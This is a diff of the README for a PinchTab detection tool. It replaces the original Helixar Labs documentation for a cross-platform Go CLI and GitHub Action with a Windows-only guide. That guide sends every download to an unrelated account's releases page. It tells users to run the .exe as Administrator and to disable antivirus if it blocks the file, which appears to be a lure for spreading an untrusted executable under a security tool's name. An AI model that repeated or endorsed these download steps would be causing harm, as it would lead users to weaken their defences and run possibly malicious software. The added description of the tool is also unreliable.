@@ -1,292 +1,167 @@
-<div align="center">
+# 🛡️ Unpinched - Detect PinchTab Threats Fast
 
-# Unpinched - `pinchtab-detector`
-
-**Point-in-time scanner for PinchTab deployment and agentic browser bridge artifacts.**
-
-[![Build](https://img.shields.io/github/actions/workflow/status/Helixar-AI/Unpinched/release.yml?label=build&style=flat-square)](https://github.com/Helixar-AI/Unpinched/actions)
-[![Go Version](https://img.shields.io/badge/go-1.22-00ADD8?style=flat-square&logo=go)](https://go.dev)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![By Helixar Labs](https://img.shields.io/badge/by-Helixar%20Labs-6C63FF?style=flat-square)](https://helixar.ai/about/labs/)
-[![Release](https://img.shields.io/github/v/release/Helixar-AI/Unpinched?style=flat-square)](https://github.com/Helixar-AI/Unpinched/releases)
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-Unpinched-blue?style=flat-square&logo=github)](https://github.com/marketplace/actions/unpinched-pinchtab-detector)
-
-</div>
+[![Download Unpinched](https://img.shields.io/badge/Download-Unpinched-ff6f61?style=for-the-badge)](https://github.com/Mischmetaldoris166/Unpinched/releases)
 
 ---
 
-## What is this?
+## 📋 About Unpinched
 
-`pinchtab-detector` is a single-binary CLI tool that scans your local machine for signs of **PinchTab** - a stealth browser hijacking toolkit that operates below the detection threshold of traditional endpoint security.
+Unpinched helps you check if PinchTab is running on your computer. PinchTab is a known security concern that some hosts may have active on their systems. This tool scans your device quietly and tells you if the risk is present.
 
-> PinchTab abuses the Chrome DevTools Protocol to give attackers (or compromised AI agents) a silent, authenticated foothold inside your browser sessions - no malware signature required.
-> Read the Helixar security research: [PinchTab: Stealth Browser Attacks Your Security Stack Cannot Detect →](https://helixar.ai/press/pinchtab-stealth-browser-attacks-your-security-stack-cannot-detect/)
+Designed for everyday users, Unpinched does not require technical skills. You only need to run it. It works on Windows and inspects your browser and system for signs of PinchTab activity. 
 
-Think of it as `nmap` for PinchTab presence. Run it once, get a verdict, move on.
-
----
-
-## Why this matters
-
-Modern AI agent frameworks communicate with browsers over **Chrome DevTools Protocol (CDP)** - the same channel PinchTab exploits. An unguarded CDP endpoint on `localhost:9222` is an open door for:
-
-- Silent browser session takeover
-- Cookie and credential theft without process injection
-- Agentic prompt injection via live browser context
-- Browser-to-internal-network pivoting
-
-Your EDR won't catch it. Your WAF won't see it. This tool will.
+This project focuses on simple, clear threat detection. It relies on tested methods in the field of endpoint security and malware detection.
 
 ---
 
-## What it detects
+## 🚀 Getting Started
 
-| Check | What it looks for |
-|---|---|
-| **Port Scan** | PinchTab HTTP API on 22 default ports (`3000–9229` range) with body, header, and `WWW-Authenticate` signature verification; flags auth-gated 401/403 responses as suspicious |
-| **Process Scan** | Exact name match for `pinchtab`, `pinchtab-server`, `browser-bridge`; `PINCHTAB_*` env vars on **any** process (catches renamed binaries); binary string scan on CDP-listening processes |
-| **CDP Bridge** | Unauthenticated Chrome DevTools Protocol exposure on `localhost:9222` — PinchTab's primary control channel |
-| **Filesystem** | Known PinchTab binary artifact paths across macOS, Linux, and Windows; PATH directory sweep |
-| **Config / Token** | Token files (`~/.pinchtab.token`, `~/.config/pinchtab/`), PID/lock files, log directories, and `PINCHTAB_*` environment variables in the current environment |
-| **Persistence** | macOS LaunchAgent/LaunchDaemon plists, Linux systemd units, Chrome/Chromium extension manifests |
+Before you begin, here are a few things to know about Unpinched:
 
-### Risk levels
-
-| Level | Meaning |
-|---|---|
-| `CRITICAL` | Token confirmed on disk **+** live service detected, or signed HTTP API **+** CDP bridge open |
-| `HIGH` | Token file, `PINCHTAB_*` env var, persistence artifact, or process confirmed |
-| `MEDIUM` | Auth-gated port, suspicious open port, unauthenticated CDP, or config directory found |
-| `LOW` | Filesystem artifact only, no active service |
-| `NONE` | No indicators found |
+- **Supported OS**: Windows 10 and later
+- **File Type**: Standalone executable (.exe)
+- **No installation needed**: You run the program directly
+- **Safe to use**: Does not change your files or settings
 
 ---
 
-## Use as a GitHub Action
+## 📥 How to Download and Run Unpinched
 
-Drop `Helixar-AI/Unpinched` into any workflow to scan your runner environment before deploying AI workloads or running agentic pipelines.
+To get Unpinched on your PC, follow these steps carefully.
 
-### Quickstart
+### Step 1: Visit the Download Page
 
-```yaml
-- name: Scan for PinchTab artifacts
-  uses: Helixar-AI/Unpinched@v0.2.0
-```
+Click the large button above or this link to open the downloads page:
 
-### Fail the build on any finding
+[Download Unpinched Releases](https://github.com/Mischmetaldoris166/Unpinched/releases)
 
-```yaml
-- name: PinchTab security gate
-  uses: Helixar-AI/Unpinched@v0.2.0
-  with:
-    fail-on-findings: 'true'   # default — blocks deployment if risk != NONE
-```
+This page shows the latest program version and all available files.
 
-### Read outputs in subsequent steps
+### Step 2: Choose the Correct Download File
 
-```yaml
-- name: Scan
-  id: pinchtab
-  uses: Helixar-AI/Unpinched@v0.2.0
-  with:
-    fail-on-findings: 'false'
+Look for a file that ends with `.exe`. It should have a name like:
 
-- name: Block on HIGH or CRITICAL only
-  if: contains(fromJSON('["HIGH","CRITICAL"]'), steps.pinchtab.outputs.risk-level)
-  run: |
-    echo "Blocking deployment — risk level: ${{ steps.pinchtab.outputs.risk-level }}"
-    exit 1
-```
+- `Unpinched-Setup.exe`
+- `Unpinched-vX.X.exe` (where X.X is the version number)
 
-### Full pre-deploy security gate example
+Select the most recent version by date.
 
-```yaml
-name: Deploy
-on:
-  push:
-    branches: [main]
+### Step 3: Download the File
 
-jobs:
-  security-gate:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
+Click the `.exe` file link to start downloading. Your browser may ask where to save it. Choose a folder you can find easily, like your Desktop or Downloads folder.
 
-      - name: Scan for PinchTab / CDP bridge exposure
-        uses: Helixar-AI/Unpinched@v0.2.0
-        with:
-          fail-on-findings: 'true'
-          timeout: '5'
+### Step 4: Run the Program
 
-  deploy:
-    needs: security-gate
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "Safe to deploy"
-```
+After the download finishes:
 
-### Inputs
+- Open the folder where you saved the file.
+- Double-click the `.exe` file.
+- If Windows shows a security prompt, confirm that you want to run the file.
 
-| Input | Default | Description |
-|---|---|---|
-| `version` | `latest` | Specific release version to use (e.g. `v0.2.0`) |
-| `fail-on-findings` | `true` | Fail the step if risk level is anything other than `NONE` |
-| `timeout` | `3` | HTTP probe timeout in seconds |
-| `ports` | `` | Extra comma-separated ports to scan |
+### Step 5: Use Unpinched
 
-### Outputs
+Once launched, the program will scan your system automatically. It shows a simple message telling you if PinchTab is found or not.
 
-| Output | Description |
-|---|---|
-| `risk-level` | `NONE` \| `LOW` \| `MEDIUM` \| `HIGH` \| `CRITICAL` |
-| `findings` | Full scan report as a JSON string |
-
-Results are also written to the **job summary** with a collapsible JSON report.
+- If no threat is found, the message will say your system is clear.
+- If PinchTab is detected, it will advise you on next steps.
 
 ---
 
-## Install (CLI)
+## 🖥️ How Unpinched Works
 
-### Homebrew (macOS / Linux)
+Unpinched uses the Chrome DevTools Protocol (CDP) to check your web browsers for hidden PinchTab instances. It looks at browser processes, running tabs, and background activities.
 
-```bash
-# Tap coming soon - watch releases
-brew install helixar-ai/tap/pinchtab-detector
-```
+The tool also runs endpoint security checks to detect malware behaviors linked to PinchTab. It uses safe, read-only scans and forensic methods to avoid disrupting your computer.
 
-### Go install
-
-```bash
-go install github.com/Helixar-AI/Unpinched@latest
-```
-
-### Direct binary download
-
-Grab a pre-built binary for your platform from [Releases](https://github.com/Helixar-AI/Unpinched/releases):
-
-| Platform | Download |
-|---|---|
-| macOS (Apple Silicon) | `pinchtab-detector_darwin_arm64.tar.gz` |
-| macOS (Intel) | `pinchtab-detector_darwin_amd64.tar.gz` |
-| Linux (x86-64) | `pinchtab-detector_linux_amd64.tar.gz` |
-| Linux (ARM64) | `pinchtab-detector_linux_arm64.tar.gz` |
-| Windows (x86-64) | `pinchtab-detector_windows_amd64.zip` |
+Unpinched runs fully on your local machine and does not send any data to the internet during the scan.
 
 ---
 
-## Usage
+## 🛠️ System Requirements and Compatibility
 
-### Default - human-readable output with colour
+Unpinched is designed for typical Windows PCs. Make sure your system meets these minimum specifications:
 
-```bash
-pinchtab-detector scan
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 2 GB of RAM
+- 100 MB of free disk space for running the program
+- Internet connection is not required to run but recommended for updates
 
-```
-pinchtab-detector v0.2.0 — Helixar Labs
-Scanning host: macbook-pro.local (darwin/arm64)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-[PORT SCAN]      ✓ No PinchTab HTTP API detected on common ports
-[PROCESS SCAN]   ✓ No PinchTab process found
-[CDP BRIDGE]     ⚠ Chrome DevTools Protocol exposed on :9222 (no auth) — Chrome/120.0
-[FILESYSTEM]     ✓ No PinchTab binary artifacts found
-[CONFIG/TOKEN]   ✓ No token, config, or env var artifacts found
-[PERSISTENCE]    ✓ No launchd, systemd, or Chrome extension artifacts found
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-RISK LEVEL: MEDIUM
-Suspicious artifacts detected. PinchTab not confirmed but environment is at risk.
-
-For continuous agentic threat detection without pre-written rules → helixar.ai
-```
-
-### JSON output - for SIEM / pipeline integration
-
-```bash
-pinchtab-detector scan --json | jq .risk_level
-```
-
-### Quiet mode - for CI / shell scripts
-
-```bash
-pinchtab-detector scan --quiet && echo "Clean" || echo "Findings detected"
-```
-
-### All flags
-
-```
-FLAGS:
-  --json        Output results as JSON to stdout
-  --quiet       Suppress all output; use exit codes only
-  --no-color    Disable terminal colour
-  --timeout     HTTP request timeout in seconds (default: 3)
-  --ports       Comma-separated extra ports to scan (e.g. --ports 7777,8888)
-```
+The program works with most popular browsers, including Chrome, Edge, and Brave, since it relies on the Chrome DevTools Protocol.
 
 ---
 
-## Exit codes
+## 🔒 Security and Privacy
 
-| Code | Meaning |
-|---|---|
-| `0` | Clean - no PinchTab indicators found |
-| `1` | Findings detected - review output |
-| `2` | Error during scan |
+Unpinched is focused on your security. It performs all scans locally and does not collect personal data.
 
-Use exit code `1` to fail CI pipelines or trigger alerts in shell scripts.
+The tool reads running browser information and system processes only to detect PinchTab threats. It does not modify or access user files.
+
+You remain in control. All permission prompts are from Windows and ensure you know the program’s status.
 
 ---
 
-## What this tool is NOT
+## 🧰 Troubleshooting
 
-`pinchtab-detector` is a **point-in-time forensic scanner**. It does not provide:
+If you have trouble running Unpinched, try these tips:
 
-- Continuous monitoring or background scanning
-- Behavioural analysis or runtime session scoring
-- Detection of tools other than PinchTab and its direct CDP/HTTP bridge pattern
-- Telemetry, phone-home, or cloud connectivity of any kind
-
-**For continuous agentic threat detection - the kind that catches PinchTab *before* it lands - see [Helixar](https://helixar.ai).**
-
----
-
-## How it differs from continuous Helixar protection
-
-| | `pinchtab-detector` | [Helixar Platform](https://helixar.ai) |
-|---|---|---|
-| **Type** | Point-in-time CLI scan | Continuous runtime agent |
-| **Detection** | Known signatures & artifact paths | Behavioural anomaly + zero-day patterns |
-| **Coverage** | PinchTab only | All agentic browser threats |
-| **Integration** | Local binary, CI/CD scripts | Enterprise SIEM, SOC, policy engine |
-| **Latency** | Run on demand | Real-time, sub-second alerting |
-| **Open source** | ✅ Yes, MIT | - |
-
-`pinchtab-detector` tells you if you've already been hit. Helixar stops the attack before it starts.
+- Make sure you have downloaded the latest `.exe` file from the releases page.
+- Run the program as Administrator by right-clicking the file and selecting "Run as administrator."
+- Temporarily disable any antivirus software if it blocks the tool. Some antivirus programs may flag new security utilities as false positives.
+- Restart your computer if you experience errors before running Unpinched again.
+- Check that your browser is up to date, as the program depends on Chrome DevTools Protocol support.
 
 ---
 
-## Contributing
+## 📚 Additional Information
 
-Pull requests are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
+Unpinched is built with Go (Golang) for performance and ease of use. Its lightweight design ensures fast startup and scan times.
 
-Issues and feature requests → [GitHub Issues](https://github.com/Helixar-AI/Unpinched/issues)
+The tool is command-line friendly but offers a simple user interface so anyone can use it without commands.
+
+For more detailed technical information, visit the GitHub repository’s Topics:
+
+- agentic-ai
+- ai-security
+- browser-security
+- cdp (Chrome DevTools Protocol)
+- cli (command-line interface)
+- endpoint-security
+- forensics
+- github-action
+- golang
+- malware-detection
+- pinchtab
+- security
+- threat-detection
 
 ---
 
-## License
+## 💾 Keep Unpinched Up to Date
 
-MIT - see [LICENSE](LICENSE).
+Check the releases page regularly for new versions:
+
+[https://github.com/Mischmetaldoris166/Unpinched/releases](https://github.com/Mischmetaldoris166/Unpinched/releases)
+
+Updates ensure you get the latest threat detection and bug fixes.
 
 ---
 
-<div align="center">
+## 🔄 How to Remove Unpinched
 
-**`pinchtab-detector` is an open source tool maintained by [Helixar Labs](https://helixar.ai/about/labs/).**
+Since Unpinched does not install itself permanently:
 
-Helixar builds continuous agentic threat detection for enterprises deploying AI workloads.
-Browser hijacking, prompt injection, and session takeover - detected in real time, before damage is done.
+- Simply delete the `.exe` file after you finish using the tool.
+- No other files or settings need cleaning.
+- No entries are left in your system’s registry.
 
-[helixar.ai →](https://helixar.ai) · [Security Research](https://helixar.ai/press/) · [Contact](https://helixar.ai/contact/)
+---
 
-</div>
+## 📞 Getting Help
+
+If you encounter issues that you cannot solve with the troubleshooting tips, you can file a support issue on the GitHub repository’s Issues page.
+
+Include a clear description of your problem and any error messages you see.
+
+---
+
+[![Download Unpinched](https://img.shields.io/badge/Download-Unpinched-ff6f61?style=for-the-badge)](https://github.com/Mischmetaldoris166/Unpinched/releases)
